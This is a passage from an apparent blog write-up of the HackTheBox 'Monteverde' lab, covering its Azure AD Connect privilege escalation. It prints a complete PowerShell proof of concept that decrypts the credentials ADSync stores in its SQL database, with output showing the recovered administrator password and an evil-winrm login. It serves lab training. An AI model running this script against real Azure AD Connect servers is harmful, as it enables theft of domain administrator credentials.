<p>Basically when deploying a new <code>ADSync</code> connector, the credentials gets stored in a local SQL Database. Then, when credentials need to be retrieved, they get decrypted using <code>mcrypt.dll</code> library located in <code>C:\Program Files\Microsoft Azure AD Sync\Bin\</code>. </p>
<p>Indeed while looking at open connection on the box we can see port <code>1434</code> (Microsoft SQL Server) listening on localhost: </p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\&gt; netstat <span class="literal">-an</span> | <span class="built_in">select-string</span> <span class="literal">-pattern</span> <span class="string">&quot;listening&quot;</span></span><br><span class="line">[<span class="type">...</span>]</span><br><span class="line">TCP    <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">1434</span>         <span class="number">0.0</span>.<span class="number">0.0</span>:<span class="number">0</span>              LISTENING</span><br></pre></td></tr></table></figure>

<h3 id="Azure-AD-Sync-privilege-escalation"><a href="#Azure-AD-Sync-privilege-escalation" class="headerlink" title="Azure AD Sync privilege escalation"></a>Azure AD Sync privilege escalation</h3><p>We should now have all the piece needed to decrypt the credentials stored in SQL Database. </p>
<p>Let’s use this <a target="_blank" rel="noopener" href="https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1">Powershell Proof-of-Concept</a> to do so:</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">Function</span> <span class="title">Azure-ADConnect</span></span> &#123;<span class="keyword">param</span>(<span class="variable">$db</span>,<span class="variable">$server</span>)</span><br><span class="line"><span class="variable">$help</span> = <span class="string">@&quot;</span></span><br><span class="line"><span class="string">.SYNOPSIS</span></span><br><span class="line"><span class="string">    Azure-ADConnect</span></span><br><span class="line"><span class="string">&quot;@</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$db</span> <span class="operator">-eq</span> <span class="variable">$null</span> <span class="operator">-or</span> <span class="variable">$server</span> <span class="operator">-eq</span> <span class="variable">$null</span>) &#123;<span class="variable">$help</span>&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable">$client</span> = <span class="built_in">new-object</span> System.Data.SqlClient.SqlConnection <span class="literal">-ArgumentList</span> <span class="string">&quot;Server = <span class="variable">$server</span>; Database = <span class="variable">$db</span>; Initial Catalog=<span class="variable">$db</span>; </span></span><br><span class="line"><span class="string">Integrated Security = True;&quot;</span></span><br><span class="line"><span class="variable">$client</span>.Open()</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$client</span>.CreateCommand()</span><br><span class="line"><span class="variable">$cmd</span>.CommandText = <span class="string">&quot;SELECT keyset_id, instance_id, entropy FROM mms_server_configuration&quot;</span></span><br><span class="line"><span class="variable">$reader</span> = <span class="variable">$cmd</span>.ExecuteReader()</span><br><span class="line"><span class="variable">$reader</span>.Read() | <span class="built_in">Out-Null</span></span><br><span class="line"><span class="variable">$key_id</span> = <span class="variable">$reader</span>.GetInt32(<span class="number">0</span>)</span><br><span class="line"><span class="variable">$instance_id</span> = <span class="variable">$reader</span>.GetGuid(<span class="number">1</span>)</span><br><span class="line"><span class="variable">$entropy</span> = <span class="variable">$reader</span>.GetGuid(<span class="number">2</span>)</span><br><span class="line"><span class="variable">$reader</span>.Close()</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$client</span>.CreateCommand()</span><br><span class="line"><span class="variable">$cmd</span>.CommandText = <span class="string">&quot;SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = &#x27;AD&#x27;&quot;</span></span><br><span class="line"><span class="variable">$reader</span> = <span class="variable">$cmd</span>.ExecuteReader()</span><br><span class="line"><span class="variable">$reader</span>.Read() | <span class="built_in">Out-Null</span></span><br><span class="line"><span class="variable">$config</span> = <span class="variable">$reader</span>.GetString(<span class="number">0</span>)</span><br><span class="line"><span class="variable">$crypted</span> = <span class="variable">$reader</span>.GetString(<span class="number">1</span>)</span><br><span class="line"><span class="variable">$reader</span>.Close()</span><br><span class="line"></span><br><span class="line"><span class="built_in">add-type</span> <span class="literal">-path</span> <span class="string">&quot;C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll&quot;</span></span><br><span class="line"><span class="variable">$km</span> = <span class="built_in">New-Object</span> <span class="literal">-TypeName</span> Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager</span><br><span class="line"><span class="variable">$km</span>.LoadKeySet(<span class="variable">$entropy</span>, <span class="variable">$instance_id</span>, <span class="variable">$key_id</span>)</span><br><span class="line"><span class="variable">$key</span> = <span class="variable">$null</span></span><br><span class="line"><span class="variable">$km</span>.GetActiveCredentialKey([<span class="type">ref</span>]<span class="variable">$key</span>)</span><br><span class="line"><span class="variable">$key2</span> = <span class="variable">$null</span></span><br><span class="line"><span class="variable">$km</span>.GetKey(<span class="number">1</span>, [<span class="type">ref</span>]<span class="variable">$key2</span>)</span><br><span class="line"><span class="variable">$decrypted</span> = <span class="variable">$null</span></span><br><span class="line"><span class="variable">$key2</span>.DecryptBase64ToString(<span class="variable">$crypted</span>, [<span class="type">ref</span>]<span class="variable">$decrypted</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable">$domain</span> = <span class="built_in">select-xml</span> <span class="literal">-Content</span> <span class="variable">$config</span> <span class="literal">-XPath</span> <span class="string">&quot;//parameter[@name=&#x27;forest-login-domain&#x27;]&quot;</span> | <span class="built_in">select</span> <span class="selector-tag">@</span>&#123;Name = <span class="string">&#x27;Domain&#x27;</span>; Expression = &#123;<span class="variable">$_</span>.node.InnerXML&#125;&#125;</span><br><span class="line"><span class="variable">$username</span> = <span class="built_in">select-xml</span> <span class="literal">-Content</span> <span class="variable">$config</span> <span class="literal">-XPath</span> <span class="string">&quot;//parameter[@name=&#x27;forest-login-user&#x27;]&quot;</span> | <span class="built_in">select</span> <span class="selector-tag">@</span>&#123;Name = <span class="string">&#x27;Username&#x27;</span>; Expression = &#123;<span class="variable">$_</span>.node.InnerXML&#125;&#125;</span><br><span class="line"><span class="variable">$password</span> = <span class="built_in">select-xml</span> <span class="literal">-Content</span> <span class="variable">$decrypted</span> <span class="literal">-XPath</span> <span class="string">&quot;//attribute&quot;</span> | <span class="built_in">select</span> <span class="selector-tag">@</span>&#123;Name = <span class="string">&#x27;Password&#x27;</span>; Expression = &#123;<span class="variable">$_</span>.node.InnerXML&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;[+] Domain:  &quot;</span> + <span class="variable">$domain</span>.Domain</span><br><span class="line"><span class="string">&quot;[+] Username: &quot;</span> + <span class="variable">$username</span>.Username</span><br><span class="line"><span class="string">&quot;[+]Password: &quot;</span> + <span class="variable">$password</span>.Password</span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>Let’s upload and run the script:</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Temp&gt; upload Azure<span class="literal">-ADConnect</span>.ps1</span><br><span class="line">Info: Uploading Azure<span class="literal">-ADConnect</span>.ps1 to C:\Temp\Azure<span class="literal">-ADConnect</span>.ps1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">Data</span>: <span class="number">3016</span> bytes of <span class="number">3016</span> bytes copied</span><br><span class="line"></span><br><span class="line">Info: Upload successful!</span><br><span class="line"></span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Temp&gt; <span class="built_in">import-module</span> ./Azure<span class="literal">-ADConnect</span>.ps1</span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Temp&gt; Azure<span class="literal">-ADConnect</span> <span class="literal">-server</span> <span class="number">127.0</span>.<span class="number">0.1</span> <span class="literal">-db</span> ADSync</span><br><span class="line">[+] Domain:  MEGABANK.LOCAL</span><br><span class="line">[+] Username: administrator</span><br><span class="line">[+]Password: d0m@in4dminyeah!</span><br></pre></td></tr></table></figure>

<p>Bingo! We got the clear text password of <code>administrator</code> account. Let’s connect to his account and grab the flag:</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[<span class="type">hg8</span>@<span class="type">archbook</span> ~]<span class="variable">$</span> evil<span class="literal">-winrm</span> <span class="literal">-i</span> <span class="number">10.10</span>.<span class="number">10.172</span> <span class="literal">-u</span> administrator <span class="literal">-p</span> <span class="string">&quot;d0m@in4dminyeah\!&quot;</span></span><br><span class="line"></span><br><span class="line">Evil<span class="literal">-WinRM</span> shell v2.<span class="number">3</span></span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line"></span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\Administrator\Documents&gt; <span class="built_in">type</span> ..\Desktop\root.txt</span><br><span class="line"><span class="number">1</span>xxxxxxxxxxxxxxxxxxc</span><br></pre></td></tr></table></figure>

<hr>
<p>That’s it folks! As always do not hesitate to contact me for any questions or feedbacks!</p>
<p>See you next time ;)</p>
<p>-hg8</p>

  </div>
</article>
<br>
<br>


    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/CTF/">CTF</a> › <a class="category-link" href="/categories/CTF/HackTheBox/">HackTheBox</a> › <a class="category-link" href="/categories/CTF/HackTheBox/Medium-Box/">Medium Box</a>
    </div>



    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/ADClient/" rel="tag">ADClient</a>, <a class="tag-link-link" href="/tags/Azure/" rel="tag">Azure</a>, <a class="tag-link-link" href="/tags/Azure-AD-Connect/" rel="tag">Azure AD Connect</a>, <a class="tag-link-link" href="/tags/Monteverde/" rel="tag">Monteverde</a>, <a class="tag-link-link" href="/tags/RPC/" rel="tag">RPC</a>, <a class="tag-link-link" href="/tags/SMB/" rel="tag">SMB</a>, <a class="tag-link-link" href="/tags/active-directory/" rel="tag">active directory</a>, <a class="tag-link-link" href="/tags/crackmapexec/" rel="tag">crackmapexec</a>, <a class="tag-link-link" href="/tags/evil-winrm/" rel="tag">evil-winrm</a>, <a class="tag-link-link" href="/tags/winRM/" rel="tag">winRM</a>, <a class="tag-link-link" href="/tags/windows/" rel="tag">windows</a>
    </div>





        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Posts</a></li>
         
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#User-Flag"><span class="toc-number">1.</span> <span class="toc-text">User Flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon"><span class="toc-number">1.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Enum4Linux"><span class="toc-number">1.2.</span> <span class="toc-text">Enum4Linux</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Brute-force-user-accounts"><span class="toc-number">1.3.</span> <span class="toc-text">Brute-force user accounts</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SABatchJobs-Shared-Folder"><span class="toc-number">1.4.</span> <span class="toc-text">SABatchJobs Shared Folder</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Evil-WinRM-shell-as-mhope"><span class="toc-number">1.5.</span> <span class="toc-text">Evil-WinRM shell as mhope</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Root-FLag"><span class="toc-number">2.</span> <span class="toc-text">Root FLag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon-1"><span class="toc-number">2.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Azure-AD-Sync-privilege-escalation"><span class="toc-number">2.2.</span> <span class="toc-text">Azure AD Sync privilege escalation</span></a></li></ol></li></ol>
    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2022
    <a href="https://hg8.sh">hg8.sh</a>
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Archives</a></li>
         
          <li><a href="/categories/">Category</a></li>
         
          <li><a href="/tags/">Tags</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


    
<script src="/lib/jquery/jquery.min.js"></script>


<script src="/js/main.js"></script>




</body>
</html>
